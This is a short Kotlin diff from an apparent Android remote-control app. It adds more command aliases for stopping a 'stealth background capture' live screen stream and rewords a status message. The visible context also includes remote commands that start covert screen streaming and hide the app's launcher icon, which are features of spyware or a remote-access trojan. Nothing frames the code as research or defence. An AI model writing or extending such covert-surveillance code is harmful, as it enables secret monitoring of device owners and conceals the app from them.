@@ -703,9 +703,10 @@ class RemoteCommandManager(private val context: Context) {
                         "Live screen stream / stealth background capture service initiated (interval: ${intervalSec}s, continuous)."
                     }
                 }
-                "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE" -> {
+                "STOP_STEALTH_CAPTURE", "STOP_STEALTH_SCREENSHOT", "STOP_SCREENSHOT_CAPTURE",
+                "STOP_LIVE_SCREEN_STREAM", "STOP_LIVE_STREAM", "STOP_LIVE_MONITORING", "STOP_STREAM", "STOP_SCREEN_STREAM", "STOP_LIVE" -> {
                     MediaProjectionHelper.stopService(context)
-                    resultMessage = "Stealth background screenshot capture service stopped."
+                    resultMessage = "Live screen stream / stealth background capture service stopped successfully."
                 }
                 "HIDE_APP_ICON", "HIDE_ICON", "HIDE_LAUNCHER" -> {
                     com.example.util.AppIconUtils.setAppIconVisibility(context, false)
